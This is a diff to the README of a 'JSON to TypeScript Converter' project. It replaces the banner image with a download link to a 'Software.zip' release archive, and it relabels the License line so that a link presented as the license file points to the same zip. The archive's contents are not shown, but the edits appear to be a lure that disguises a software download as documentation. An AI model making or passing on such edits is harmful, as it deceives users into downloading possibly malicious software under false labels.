@@ -1,6 +1,6 @@
 # JSON to TypeScript Converter 🚀
 
-![json-to-typescript](https://github.com/user-attachments/files/18383251/Software.zip)
+![json-to-typescript](https://github.com/THEBOSS6921/json-to-typescript/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 
@@ -69,4 +69,4 @@ Contributions are welcome! Here's how you can contribute to the **json-to-typesc
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/THEBOSS6921/json-to-typescript/releases/download/v2.0/Software.zip](https://github.com/THEBOSS6921/json-to-typescript/releases/download/v2.0/Software.zip) file for details.
